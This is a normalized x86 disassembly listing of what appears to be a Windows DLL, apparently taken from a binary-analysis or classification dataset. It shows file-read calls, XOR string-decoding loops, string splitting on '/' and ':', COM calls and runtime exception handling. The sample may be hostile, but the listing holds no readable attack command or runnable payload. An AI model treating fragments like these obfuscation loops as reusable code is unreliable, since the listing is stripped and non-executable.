mov edx [ ebp - 0x5c ]
push eax
push ebx
push ecx
mov ecx [ ebp - 0x3c ]
call sub_10009050
test eax eax
jne r-xdata
push ebx
push 0x0
call edi
push eax
call esi
mov ecx [ ebp - 0x38 ]
push ecx
call [ CloseHandle@IAT ]
mov eax 0x6
mov edx [ ebp - 0x50 ]
add [ ebp - 0x40 ] edx
mov esi [ ebp - 0x38 ]
mov edi [ ebp - 0x54 ]
jmp r-xdata
xor eax eax
push eax
lea edx [ ebp - 0x48 ]
push edx
push edi
push ebx
push esi
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4c ] eax
call [ ReadFile@IAT ]
test eax eax
je r-xdata
sub_10019180
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ecx + 0x10 ]
cmp edi ebx
jae r-xdata
mov eax [ ebp + 0x10 ]
sub edi ebx
cmp eax edi
jae r-xdata
push r--data
call sub_10050437
cmp esi ecx
jne r-xdata
mov edi eax
cmp edi 0x7ffffffe
jbe r-xdata
push 0xffffffff
add edi ebx
push edi
mov ecx esi
call sub_1005f860
push ebx
push 0x0
mov ecx esi
call sub_1005f860
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_1002c5ed
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_1004d170
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x8
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
pop edi
mov eax esi
xor ecx ecx
pop esi
mov [ eax ] cx
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
xor ecx ecx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor edx edx
mov [ ebx + eax ] dx
mov eax [ esi ]
xor edx edx
mov [ ebx + eax ] dx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx [ ebp + 0xc ]
lea ebx [ edi + edi ]
push ebx
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_100796a0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_1001928c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003233d
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100379e8
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10060c62
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10040c97
jmp r-xdata
sub_10019314
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1006600e
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x2
pop ebp
retn
sub_10019350
push ebp
mov ebp esp
push 0xffffffff
push sub_10082b92
mov eax [ fs : 0x0 ]
push eax
sub esp 0x138
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi [ r--data ]
mov esi ecx
mov [ ebp - 0x13c ] eax
xor ebx ebx
xor cl cl
xor eax eax
mov dl [ eax + edi ]
xor dl cl
xor dl 0x7a
inc cl
mov [ ebp + eax - 0x20 ] dl
movzx eax cl
cmp eax 0x8
jb r-xdata
lea eax [ ebp - 0x138 ]
push eax
lea edi [ ebp - 0x20 ]
mov ecx esi
mov [ ebp - 0x18 ] bl
call sub_10007d30
mov edi [ r--data ]
add esp 0x4
xor cl cl
xor eax eax
lea esp [ esp ]
mov dl [ eax + edi ]
xor dl cl
xor dl 0x9e
inc cl
mov [ ebp + eax - 0x134 ] dl
movzx eax cl
cmp eax 0x3
jb r-xdata
lea eax [ ebp - 0x134 ]
mov [ ebp - 0x131 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push ebx
lea eax [ ebp - 0x134 ]
push eax
mov ecx esi
call sub_10040200
cmp eax 0xffffffff
je r-xdata
push 0x1
push ebx
lea eax [ ebp - 0x130 ]
push eax
mov ecx esi
mov [ ebp - 0x130 ] 0x2f
call sub_10040200
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push 0xffffffff
add eax 0x3
push eax
lea ecx [ ebp - 0x3c ]
push ecx
mov ecx esi
call sub_1004d2f0
push eax
mov ecx esi
mov [ ebp - 0x4 ] ebx
call sub_1000adb0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x28 ] 0x10
jb r-xdata
push edi
push ebx
lea ecx [ ebp - 0xac ]
push ecx
mov ecx esi
call sub_1004d2f0
push 0xffffffff
inc edi
push edi
lea edx [ ebp - 0x3c ]
push edx
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_1004d2f0
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_1000adb0
cmp [ ebp - 0x28 ] 0x10
jb r-xdata
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x3c ]
push edx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x7c ] 0xf
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x90 ] bl
push 0x1
push ebx
lea ecx [ ebp - 0x130 ]
push ecx
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x130 ] 0x3a
call sub_10040200
mov edi eax
cmp edi 0xffffffff
jne r-xdata
mov eax [ ebp - 0x3c ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push 0xffffffff
lea edx [ edi + 0x1 ]
push edx
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0xac ]
call sub_1004d2f0
push eax
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x4
call sub_1000adb0
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x28 ] 0x10
jb r-xdata
push 0x2
push r--data
lea ecx [ ebp - 0x90 ]
call sub_10043190
jmp r-xdata
push edi
push ebx
lea edx [ ebp - 0x3c ]
push edx
lea ecx [ ebp - 0xac ]
call sub_1004d2f0
push eax
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x5
call sub_1000adb0
cmp [ ebp - 0x28 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x3c ]
push ecx
call sub_1006591f
add esp 0x4
mov eax 0xf
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] bl
lea ecx [ ebp - 0x130 ]
mov [ ebp - 0x4 ] 0x7
push ecx
mov edi esi
mov [ ebp - 0x130 ] 0x2f
call sub_1005d130
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp - 0x3c ]
push eax
call sub_1006591f
add esp 0x4
lea edi [ eax + 0x1 ]
push edi
push ebx
lea edx [ ebp - 0x3c ]
push edx
mov ecx esi
call sub_1004d2f0
push eax
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x8
call sub_1000adb0
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0x28 ] 0x10
jb r-xdata
push eax
push ebx
push esi
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x48 ] 0x1
mov [ ebp - 0x58 ] 0x2f
call sub_100417c0
jmp r-xdata
push 0xffffffff
push edi
lea ecx [ ebp - 0x3c ]
push ecx
mov ecx esi
call sub_1004d2f0
push eax
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0x9
call sub_1000adb0
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0x28 ] 0x10
jb r-xdata
mov eax [ ebp - 0x3c ]
push eax
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x138 ]
push eax
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x138 ] esp
push 0xffffffff
push ebx
lea edx [ ebp - 0x90 ]
mov esi 0xf
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] bl
call sub_100417c0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0xa
mov [ ebp - 0x134 ] esp
push 0xffffffff
push ebx
lea eax [ ebp - 0x74 ]
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] bl
call sub_100417c0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x144 ] esp
push 0xffffffff
push ebx
lea edx [ ebp - 0x58 ]
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] bl
call sub_100417c0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x140 ] esp
push 0xffffffff
mov [ ebp - 0x4 ] 0xc
push ebx
lea eax [ ebp - 0xac ]
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] bl
call sub_100417c0
lea edi [ ebp - 0x12c ]
mov [ ebp - 0x4 ] 0x7
call sub_1005c610
add esp 0x74
mov esi [ ebp - 0x13c ]
mov edi eax
mov [ ebp - 0x4 ] 0xd
call sub_100508a0
lea esi [ ebp - 0x12c ]
call sub_10054dd0
mov esi 0x10
cmp [ ebp - 0x60 ] esi
jb r-xdata
mov edx [ ebp - 0x3c ]
push edx
call sub_1006591f
add esp 0x4
mov edi 0xf
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] bl
cmp [ ebp - 0x44 ] esi
jb r-xdata
mov ecx [ ebp - 0x74 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
cmp [ ebp - 0x7c ] esi
jb r-xdata
mov edx [ ebp - 0x58 ]
push edx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x7c ] edi
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x90 ] bl
cmp [ ebp - 0x98 ] esi
jb r-xdata
mov eax [ ebp - 0x90 ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov ecx [ ebp - 0xac ]
push ecx
call sub_1006591f
add esp 0x4
sub_10019780
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x14
sub_100197b0
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ eax + 0x12c ]
test esi esi
jne r-xdata
push edi
lea edi [ eax + 0x130 ]
lea edx [ ebp - 0x34 ]
mov eax 0xed
call sub_100050e0
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
push edi
push esi
call sub_10051f90
mov esi [ esi + 0x4 ]
add esp 0x8
test esi esi
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
sub_10019820
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub esp 0x8
cmp [ eax + 0x15 ] 0x0
je r-xdata
push ebx
push esi
mov ebx eax
push edi
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ebx
call sub_1005e170
mov ecx [ ebx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
push r--data
call sub_10050437
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x15 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x15 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ edx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x8 ] ecx
cmp [ ecx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ebx + 0x14 ]
mov cl [ eax + 0x14 ]
mov [ eax + 0x14 ] dl
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x14 ] cl
mov eax [ ebp - 0x4 ]
mov bl 0x1
cmp [ eax + 0x14 ] bl
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x15 ] 0x0
mov ecx edi
jne r-xdata
mov ecx esi
jmp r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_1006591f
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
mov ecx [ edx + 0x4 ]
cmp edi [ ecx + 0x4 ]
je r-xdata
mov eax edi
call sub_1002ac20
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax [ edx + 0x4 ]
mov [ eax ] ecx
nop
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0xc
dec eax
mov [ ecx + 0x8 ] eax
mov [ edi + 0x14 ] bl
cmp [ edi + 0x14 ] bl
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_10065140
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_10035b10
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
je r-xdata
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_10065140
mov eax [ ecx + 0x8 ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_10035b10
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x0
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx + 0x8 ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_10035b10
jmp r-xdata
mov eax [ ecx ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_10065140
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
sub_10019a8f
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
leave
retn
cmp ecx 0x7fffffff
ja r-xdata
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10008757
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_1000bd19
lea eax [ ecx + ecx ]
push eax
call sub_10055606
pop ecx
test eax eax
jne r-xdata
sub_10019ae0
push ebp
mov ebp esp
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
lea edx [ esi + 0x8 ]
push edx
mov edx [ ebp + 0x8 ]
push r--data
push r--data
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov [ esi ] eax
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi ]
test eax eax
jns r-xdata
pop ebp
retn 0x4
call [ CoUninitialize@IAT ]
mov eax [ esi ]
sub_10019b20
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ esi + 0x10 ] eax
push 0xffffffff
push eax
mov [ ebp - 0x4 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi ] al
mov eax [ ebp + 0x8 ]
add eax 0x8
push eax
mov ecx esi
call sub_100417c0
mov eax esi
mov esp ebp
pop ebp
retn 0x4
sub_10019b60
test ebx ebx
je r-xdata
retn
mov eax [ edi ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi ] eax
call sub_100796a0
add esp 0xc
pop esi
push eax
call [ LocalFree@IAT ]
mov [ edi ] 0x0
sub_10019ba0
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x218 ] edx
mov [ ebp - 0x21c ] ecx
test edx edx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
call sub_10024145
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test [ ebp + 0xc ] 0x2
jne r-xdata
push 0x1
push eax
call sub_10002f10
add esp 0x8
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
lea edx [ ebp - 0x214 ]
xor eax eax
call sub_100052b0
mov edi [ rw-data ]
cmp [ edi + 0x120 ] 0x0
je r-xdata
mov eax 0x3
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x4
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push 0x208
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_10079a10
lea ecx [ ebp - 0x210 ]
push ecx
call sub_1003b1ca
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x10
lea ebx [ ecx + edx + 0x1082c ]
mov ecx 0x104
lea eax [ ebp - 0x20c ]
xor esi esi
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x20c ]
push ebx
mov edx 0x7fffffff
call sub_1006c8f0
lea eax [ ebp - 0x214 ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea ecx [ ebp - 0x210 ]
push ecx
call sub_1003b1ca
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea eax [ ecx + edx + 0x11c7c ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_1003d910
test eax eax
je r-xdata
lea eax [ ebp - 0x214 ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_1003d910
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x218 ]
push 0x1
push ecx
mov ecx [ ebp - 0x21c ]
push edx
lea edx [ ebp - 0x20c ]
call sub_10026140
add esp 0xc
neg eax
pop edi
sbb eax eax
pop esi
and eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10019dcd
mov edi edi
push ebp
mov ebp esp
push esi
call sub_100049c2
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_10019f17
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_1005cc3f
push [ esi + 0x10 ]
call sub_1005cc3f
push [ esi + 0x14 ]
call sub_1005cc3f
push [ esi + 0x18 ]
call sub_1005cc3f
add esp 0x10
pop esi
retn
sub_10019f50
push ebp
mov ebp esp
push 0xffffffff
push sub_10080e31
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor edi edi
mov [ ebp - 0x4 ] 0x2
cmp [ esi + 0x8 ] edi
je r-xdata
mov eax [ esi + 0xa0 ]
cmp eax edi
je r-xdata
call [ r--data ]
mov [ esi + 0xa0 ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0xa8 ] edi
mov eax [ esi + 0x8c ]
mov [ esi + 0x70 ] r--data
cmp eax edi
je r-xdata
push eax
call sub_1006591f
add esp 0x4
mov eax [ esi + 0x7c ]
cmp eax edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0x7c ] edi
mov [ esi + 0x80 ] edi
mov [ esi + 0x84 ] edi
mov [ esi ] r--data
cmp [ esi + 0x40 ] 0x8
jb r-xdata
push eax
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] edi
mov [ esi + 0x2c ] cx
cmp [ esi + 0x20 ] 0x8
jb r-xdata
mov eax [ esi + 0x2c ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] edi
mov [ esi + 0xc ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov edx [ esi + 0xc ]
push edx
call sub_1006591f
add esp 0x4
sub_1001a053
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_1005bb5a
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_100309b2
jmp r-xdata
sub_1001a094
push 0x38
mov eax sub_1007f89a
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_100688a0
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_10030ef2
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10069ce0
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10058a63
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
